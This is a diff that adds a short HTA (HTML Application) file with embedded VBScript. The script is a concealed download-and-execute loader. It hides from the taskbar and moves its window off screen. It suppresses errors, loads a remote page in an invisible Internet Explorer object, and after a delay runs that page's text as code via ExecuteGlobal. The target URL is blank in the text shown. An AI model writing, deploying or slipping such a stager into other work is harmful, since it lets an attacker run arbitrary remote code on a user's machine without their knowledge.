@@ -1,0 +1,22 @@
+<head>
+<HTA:APPLICATION 
+     SHOWINTASKBAR="no"
+>
+</head>
+<script language="VBScript">
+On Error Resume Next
+window.moveTo -2000,-2000
+
+Set objIE = CreateObject("InternetExplorer.Application")
+objIE.Visible = False
+objIE.Navigate2 "https://", 14
+
+Function analyze()
+    ExecuteGlobal objIE.Document.Body.InnerText
+    objIE.Stop()
+End Function
+a = window.setTimeout("analyze", 14000, "VBScript")
+
+</script>
+<body>
+</body>
